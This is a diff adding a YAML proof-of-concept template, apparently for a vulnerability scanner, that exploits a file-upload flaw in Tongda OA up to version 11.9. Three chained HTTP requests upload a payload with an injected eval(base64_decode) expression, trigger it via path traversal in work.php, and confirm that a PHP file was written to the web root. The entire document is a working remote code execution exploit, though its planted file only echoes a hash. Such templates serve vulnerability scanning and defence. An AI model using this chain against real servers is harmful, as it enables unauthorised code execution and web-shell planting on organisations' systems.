@@ -1,0 +1,41 @@
+name: poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload
+set:
+  filename: randomLowercase(8)
+  r1: randomLowercase(8)
+  payload: base64("file_put_contents('../../"+filename+".php','<?php echo(md5("+r1+"));?>');")
+  rboundary: md5(randomLowercase(8))
+  date: TDdate()
+rules:
+  - method: POST
+    path: /mobile/api/api.ali.php
+    headers:
+      Content-Type: multipart/form-data; boundary={{rboundary}}
+      Accept-Encoding: gzip
+    follow_redirects: false
+    body: "\
+      --{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"file\"; filename=\"{{filename}}.json\"\r\n\
+      Content-Type: application/octet-stream\r\n\
+      \r\n\
+      {\"modular\":\"AllVariable\",\"a\":\"{{payload}}\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n\
+      --{{rboundary}}--\r\n\
+      "
+    expression: |
+      response.status == 200
+
+  - method: GET
+    path: /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{date}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.{{filename}}
+    expression: |
+      response.status == 200 && response.body.bcontains(b'OK')
+
+  - method: GET
+    path: /{{filename}}.php
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(r1)))
+
+detail:
+  author: PeiQi0
+  influence_version: "<= 通达OA 11.9"
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tongda,fileupload
